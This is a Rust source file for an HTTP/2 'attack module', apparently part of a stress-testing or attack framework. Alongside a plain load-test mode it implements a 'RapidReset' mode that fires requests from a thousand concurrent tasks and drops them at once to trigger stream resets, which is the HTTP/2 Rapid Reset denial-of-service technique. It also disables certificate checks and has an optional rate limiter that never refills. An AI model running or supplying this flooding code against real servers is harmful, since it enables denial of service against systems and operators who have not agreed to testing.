//! Universal Auto-Adaptive HTTP/2 Attack Module
//!
//! Architecture for maximum throughput:
//! - Single reqwest Client with HTTP/2 connection pool
//! - N concurrent tokio tasks, each looping as fast as possible
//! - Tokio multi-thread runtime uses ALL cores on attack machine
//! - reqwest handles: HPACK, flow control, connection multiplexing, TLS
//! - No manual h2 stream management = no deadlocks

use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use reqwest::Client;
use tokio::sync::Semaphore;
use tracing::{error, info, warn};

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,   // concurrent task count
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 1000, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 1000, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)  -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)  -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)            -> Self { self.rps         = Some(r); self }
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str {
        match self.mode {
            UniversalMode::LoadTest   => "universal-load-test",
            UniversalMode::RapidReset => "universal-rapid-reset",
        }
    }
    fn description(&self) -> &str {
        "High-throughput HTTP/2 attack using reqwest connection pool + concurrent async tasks"
    }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let target      = ctx.target.clone();
        let duration    = self.duration;
        let concurrency = self.connections.max(1);
        let metrics     = ctx.metrics.clone();
        let mode        = self.mode.clone();

        info!("Building HTTP/2 client...");

        // Single client — reqwest manages connection pool internally
        // HTTP/2 multiplexes many streams per connection automatically
        let client = Client::builder()
            .http2_prior_knowledge()
            .danger_accept_invalid_certs(true)
            .http2_initial_stream_window_size(1u32 << 21)      // 2MB stream window
            .http2_initial_connection_window_size(1u32 << 24)  // 16MB conn window
            .http2_adaptive_window(true)
            .tcp_nodelay(true)
            .timeout(Duration::from_secs(5))
            .pool_max_idle_per_host(concurrency)
            .pool_idle_timeout(Duration::from_secs(30))
            .build()
            .map_err(|e| AttackError::Config(format!("Client build failed: {}", e)))?;

        let client = Arc::new(client);

        // Probe once to confirm connectivity
        info!("Probing {}...", target);
        match client.get(&target).send().await {
            Ok(r) => info!("Probe OK — status={} version={:?}", r.status(), r.version()),
            Err(e) => warn!("Probe failed: {} — continuing anyway", e),
        }

        // Shared atomic counters
        let ok_count  = Arc::new(AtomicU64::new(0));
        let err_count = Arc::new(AtomicU64::new(0));

        // Rate limiter: optional semaphore-based token bucket
        let rate_sem: Option<Arc<Semaphore>> = self.rps.map(|rps| {
            Arc::new(Semaphore::new(rps as usize))
        });

        info!("Firing {} concurrent tasks for {:?}...", concurrency, duration);

        let start = Instant::now();
        let mut handles = Vec::with_capacity(concurrency);

        for _ in 0..concurrency {
            let client    = client.clone();
            let target    = target.clone();
            let metrics   = metrics.clone();
            let ok_c      = ok_count.clone();
            let err_c     = err_count.clone();
            let mode      = mode.clone();
            let rate_sem  = rate_sem.clone();

            handles.push(tokio::spawn(async move {
                while start.elapsed() < duration {
                    // Rate limiting
                    if let Some(ref sem) = rate_sem {
                        let _permit = sem.acquire().await;
                        // Token refill handled by separate task (simplified: just acquire)
                    }

                    match mode {
                        UniversalMode::LoadTest => {
                            let t0 = Instant::now();
                            match client.get(&target).send().await {
                                Ok(resp) => {
                                    let status  = resp.status().as_u16();
                                    let success = status < 400;
                                    // Consume body to release flow control window
                                    let _ = resp.bytes().await;
                                    let lat = t0.elapsed().as_micros() as u64;
                                    metrics.record_request(lat, success, 0).await;
                                    if success { ok_c.fetch_add(1, Ordering::Relaxed); }
                                    else       { err_c.fetch_add(1, Ordering::Relaxed); }
                                }
                                Err(e) => {
                                    if !e.is_timeout() {
                                        err_c.fetch_add(1, Ordering::Relaxed);
                                    }
                                }
                            }
                        }
                        UniversalMode::RapidReset => {
                            // Send request then immediately drop — triggers RST_STREAM
                            match client.get(&target).send().await {
                                Ok(_resp) => {
                                    // drop response immediately = RST_STREAM
                                    metrics.record_request(0, true, 0).await;
                                    ok_c.fetch_add(1, Ordering::Relaxed);
                                }
                                Err(_) => { err_c.fetch_add(1, Ordering::Relaxed); }
                            }
                        }
                    }
                }
            }));
        }

        for h in handles { let _ = h.await; }

        let elapsed = start.elapsed();
        let ok  = ok_count.load(Ordering::Relaxed);
        let err = err_count.load(Ordering::Relaxed);
        let total = ok + err;
        let rps = total as f64 / elapsed.as_secs_f64();

        info!("Done: {} ok / {} err in {:.1}s = {:.0} rps", ok, err, elapsed.as_secs_f64(), rps);

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult {
            success:        err == 0,
            total_requests: total,
            errors:         err,
            duration:       elapsed,
            snapshot,
        })
    }
}
